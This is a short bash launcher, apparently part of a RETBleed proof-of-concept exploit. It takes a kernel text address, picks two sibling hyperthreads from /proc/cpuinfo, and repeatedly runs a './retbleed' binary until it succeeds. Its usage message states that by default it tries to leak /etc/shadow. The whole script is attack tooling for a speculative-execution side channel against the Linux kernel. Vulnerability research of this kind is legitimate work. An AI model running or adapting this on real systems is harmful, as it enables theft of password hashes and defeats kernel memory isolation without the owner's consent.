#!/bin/bash
set -e

if [ $# -lt 1 ]; then
  echo "usage: $0 <kernel_text> [core_id=0] [--leak_perf]"
  echo "  unless leak_perf is set (to anything), try to leak /etc/shadow"
  exit 1
fi

KERN_TEXT=$1
CORE=${2:-0}

cpulist=($(grep core\ id /proc/cpuinfo | nl -v 0 | grep "$CORE$" | sed 's/\s*\([0-9]*\).*$/\1/g'))
HT1=${cpulist[0]}
HT2=${cpulist[1]}
echo Using Core $HT1 and $HT2

while ! ./retbleed --shm=$HT1 --cpu1=$HT1 --cpu2=$HT2 --kbase=$KERN_TEXT $3; do
  true;
done
